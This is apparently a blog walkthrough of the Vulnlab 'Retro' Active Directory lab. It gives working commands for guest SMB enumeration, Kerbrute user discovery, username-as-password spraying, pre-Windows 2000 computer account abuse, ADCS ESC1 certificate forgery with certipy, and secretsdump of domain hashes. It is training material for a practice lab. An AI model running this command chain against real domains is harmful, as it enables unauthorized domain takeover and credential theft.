---
layout: post
title: Vulnlab - Retro Walkthrough
date: 19-04-2025
categories: [Vulnlab]
tags: [pre2k, changepasswd, adcs,ESC1, certipy]
image: "https://assets.vulnlab.com/retro_slide.png"
---

## Introduction

Welcome back to my Active Directory exploitation series from Vulnlab! In the previous post, we tackled `Baby2`, where we explored `ACL` abuse and `GPO` misconfigurations for privilege escalation within a Windows AD environment.

Today, we're diving into the next lab in the series `Retro`.

`Retro` is a solo, junior-level Windows Active Directory machine that introduces new attack paths involving `Pre-created Computer Accounts` and the powerful, often-overlooked `Active Directory Certificate Services (ADCS)`.

These two components are common in enterprise environments, and misconfigurations here can open doors to full domain compromise — even without high initial privileges.

> By the end of this lab, you’ll have hands-on experience with:
>- Enumerating and abusing pre-created machine accounts
>- Exploiting misconfigured ADCS for privilege escalation 
{: .prompt-tip }

### Understanding the Concepts
Before jumping into the exploitation phase, let’s break down the two main concepts this lab focuses on `Pre-Created Computer Accounts` and `Active Directory Certificate Services (ADCS)` in a beginner-friendly way.

**Pre-Created Computer Accounts**
> `Pre-Created Computer Accounts` In Active Directory environments, every computer that joins the domain gets its own account just like users do. Normally, these accounts are created during the domain join process. But sometimes, IT admins pre-create them ahead of time.Why? To control exactly how a machine joins the domain and what permissions it has. Here’s where it gets interesting for attackers, When a computer account is pre-created(if the "*Assign this computer account as a pre-Windows 2000 computer*" checkbox is `enabled`)), the computer account is given a default, predictable password, the account name in lowercase. For example, a computer account named `HRLaptop$` would have the password `hrlaptop`. 
{: .prompt-tip }

**Active Directory Certificate Services (ADCS)**
> `Active Directory Certificate Services (ADCS)` is a Windows Server role for issuing and managing `Public Key infrastructure (PKI)` certificates used in secure communication and authentication protocols.
{: .prompt-tip }
> `ADCS` is like a digital ID system in Windows networks. It lets users and devices request certificates (like ID cards) to prove who they are. These certificates are used for things like secure logins, encryption, and communication.But if it’s misconfigured, attackers can trick the system into giving them certificates for privileged users like `Administrator`.That means the attacker could log in as an `Administrator` using just a certificate, completely bypassing normal security checks.
{: .prompt-tip }

>Now that we’ve broken down and understood the key concepts of `Pre-Created Computer Accounts` and `Active Directory Certificate Services (ADCS)`, let’s dive into the practical exploitation steps and see how these misconfigurations can be leveraged in Active Directory environment.
{: .prompt-tip }

### Tools Breakdown
> NetExec(nxc): network execution tool for interacting with various services remotely, supporting protocols like VNC, SSH, WINRM, MSSQL, FTP, LDAP, RDP, WMI, NFS, SMB. It allows for remote code execution and service interaction using valid credentials across different network protocols.
{: .prompt-tip }

> SMBclient: command-line client for accessing shared folders and files over the SMB protocol. It was used to interact with shared folders on the target machine, gather information about the logon script, and later upload a modified version to establish a reverse shell.
{: .prompt-tip }

> BloodHound: is a tool for Active Directory enumeration that maps out attack paths and privilege escalation opportunities in AD environments.
{: .prompt-tip }

> 
{: .prompt-tip }

> 
{: .prompt-tip }

> Impacket Secretsdump:  tool from the Impacket suite that is used to dump credentials, hashes, and other sensitive information from Windows machines.
{: .prompt-tip }

> Evil-WinRM: A tool to remotely access Windows machines via WinRM using valid credentials for shell access.
{: .prompt-tip }


## Scanning

```bash
nmap -Pn -T4 -sC -sV -p- --open --min-rate=10000 10.10.88.155 -oN reports/all_tcp.txt
```

```bash
➜  Retro nmap -Pn -T4 -sC -sV -p- --open --min-rate=10000 10.10.88.155 -oN reports/all_tcp.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 19:40 EAT
Nmap scan report for 10.10.88.155 (10.10.88.155)
Host is up (0.18s latency).
Not shown: 65526 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    VERSION
53/tcp    open  domain     Simple DNS Plus
135/tcp   open  msrpc      Microsoft Windows RPC
139/tcp   open  tcpwrapped
389/tcp   open  tcpwrapped
	| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-04-13T16:26:36
|_Not valid after:  2026-04-13T16:26:36
445/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-04-12T16:35:20
|_Not valid after:  2025-10-12T16:35:20
49681/tcp open  tcpwrapped
49712/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.34 seconds
```

## Enumeration

### SMB

After running an Nmap scan, we identified several ports commonly seen in Active Directory environments. We began our enumeration with SMB, which revealed `Guest` access was enabled with an `empty password`. While browsing the available shares, we discovered that the Trainees share was readable.

```powershell
nxc smb 10.10.79.94 -u 'Guest' -p '' --shares
```

![alt text](/assets/screenshots/Retro/1.png)

Inside, we found a file named `Important.txt` a message from the admins stating they had *bundled their accounts into one* because they were tired of constantly resetting forgotten passwords. This strongly `hinted at a weak or default credential setup`, possibly using usernames like `trainee` or `trainees` with passwords matching the usernames (e.g., `trainee:trainee`).

![alt text](/assets/screenshots/Retro/2.png)

To confirm our suspicion of weak credentials, we used `Kerbrute` for user enumeration This revealed a valid user account `trainee`.

```powershell
kerbrute userenum  -d retro.vl  --dc 10.10.79.94  -t 100 wordlists/userslist.txt
```

![alt text](/assets/screenshots/Retro/3.png)

We then tested common password patterns using `NetExec (nxc)`, where we assumed the `username` might be `used as` the `password`. And it worked! 

```powershell
nxc smb 10.10.79.94 -u loots/users.txt -p loots/users.txt  --no-bruteforce --continue-on-success
```

![alt text](/assets/screenshots/Retro/4.png)

Enumerating users

```powershell
nxc smb 10.10.79.94 -u trainee -p trainee --users
```

![alt text](/assets/screenshots/Retro/5.png)

After having a list of users we could have trained AS-REP Roasting and Kerberoasting but both of dindt work here

Kerberoasting

```powershell
GetUserSPNs.py -dc-ip 192.168.1.241  retro.vl/trainee:trainee  -request
```

AS-REP Roasting

```powershell
GetNPUsers.py retro.vl/trainee:trainee -usersfile loots/users.txt  -dc-ip 10.10.79.94
```

![alt text](/assets/screenshots/Retro/6.png)

Enumerating Shares

```powershell
nxc smb 10.10.79.94 -u trainee -p trainee --shares
```

![alt text](/assets/screenshots/Retro/7.png)

Hinting about pre created computer account

```powershell
smbclient -U trainee //10.10.79.94/Notes
```

![alt text](/assets/screenshots/Retro/8.png)

Abusing Weak AD Permision Pre2K Compatibility

Using netexec

```powershell
nxc ldap 10.10.79.94 -u trainee -p trainee -M pre2k
```

![alt text](/assets/screenshots/Retro/9.png)

using the ccache

```powershell
export KRB5CCNAME=loots/tickets/banking.ccache
```

![alt text](/assets/screenshots/Retro/10.png)

Confirm

```powershell
nxc smb 10.10.79.94 --use-kcache
```

![alt text](/assets/screenshots/Retro/11.png)

Also Changing Password

```powershell
nxc smb 10.10.79.94 -u "BANKING$" -p banking
```

![alt text](/assets/screenshots/Retro/12.png)

change

```powershell
changepasswd.py retro.vl/BANKING\$@10.10.79.94 -newpass 'Password123!' -p rpc-samr
```

![alt text](/assets/screenshots/Retro/13.png)

Confirm

```powershell
nxc smb 10.10.79.94 -u "BANKING$" -p 'Password123!'
```

![alt text](/assets/screenshots/Retro/14.png)

ADCS

```powershell
nxc ldap 10.10.79.94 --use-kcache -M adcs
```

![alt text](/assets/screenshots/Retro/15.png)

Using Certipy

```powershell
certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -debug
```

![alt text](/assets/screenshots/Retro/16.png)

Find Vulnerable Templates

```powershell
certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -stdout -vulnerable
```

![alt text](/assets/screenshots/Retro/17.png)

![alt text](/assets/screenshots/Retro/18.png)

## Initial access

Exploting ESC1

```powershell
certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.79.94' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -debug
```

![alt text](/assets/screenshots/Retro/19.png)

![alt text](/assets/screenshots/Retro/20.png)

Confirm

```powershell
nxc smb 10.10.79.94 -u 'DC$' -H 532f3be569a64881ec82f1cc875059e3
```

![alt text](/assets/screenshots/Retro/21.png)

or we can request directly administartor

```powershell
certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.73.65' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -upn 'administrator@retro.vl'
```

## Privilege Escalation

dumped the secrets

```powershell
secretsdump.py retro.vl/'DC$'@10.10.79.94 -hashes aad3b435b51404eeaad3b435b51404ee:532f3be569a64881ec82f1cc875059e3
```

![alt text](/assets/screenshots/Retro/23.png)

## References

[NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)

[Pre-Windows 2000 computers | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)

[Diving into Pre-Created Computer Accounts](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)

[Abusing AD Weak Permission Pre2K Compatibility](https://www.hackingarticles.in/abusing-ad-weak-permission-pre2k-compatibility/)

[Certificate templates | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates)